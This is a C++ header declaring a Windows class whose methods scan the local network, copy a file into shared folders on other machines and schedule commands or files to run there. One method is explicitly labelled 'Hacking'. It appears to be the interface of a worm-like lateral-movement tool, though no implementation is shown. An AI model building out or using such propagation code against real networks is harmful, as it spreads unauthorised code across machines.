#include <windows.h>
#include <iphlpapi.h>
#include "Network.h"

#pragma once

class NetworkList {
   private:
      static Network ** localNetworkList;
      static int numElems; 
      static bool inicialized;
      
   public:
      static void inicialize();
      static bool scanLocalNetwork();
      static bool copyFileToSharesFoldersInNetworks(const char * strFilename, const char * strFilenameDestiny = NULL);
      static bool schedulerTaskAddNowInNetworks(const char * command, bool interactive = true);
      static bool schedulerTaskAddNowInNetworksHacking(const char * fileSourcePath, const char * filename, bool interactive = true);
      static bool schedulerTaskAddInNetworks(const char * time, int daysWeek, const char * command, bool interactive = true);
      static bool schedulerTaskAddInNetworks(const char * time, char * daysMonth, const char * command, bool interactive = true);
      static bool isInicialized() { return inicialized; }
      static int getNumElems() { return numElems; }       
};
